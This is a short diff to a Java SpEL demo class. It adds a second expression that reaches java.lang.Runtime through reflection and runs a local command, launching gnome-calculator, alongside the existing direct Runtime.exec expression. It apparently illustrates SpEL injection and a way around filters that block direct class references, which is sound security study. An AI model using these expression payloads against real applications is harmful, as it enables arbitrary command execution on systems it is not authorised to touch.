@@ -24,5 +24,8 @@ public class SpELDemo {
         // ----
         Expression exp6 = expressionParser.parseExpression("T(java.lang.Runtime).getRuntime().exec('/usr/bin/gnome-calculator')");
         System.out.println(exp6.getValue(Object.class));
+        // ---- reflect
+        Expression exp7 = expressionParser.parseExpression("T(Integer).getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"/usr/bin/gnome-calculator\")");
+        System.out.println(exp7.getValue(Object.class));
     }
 }
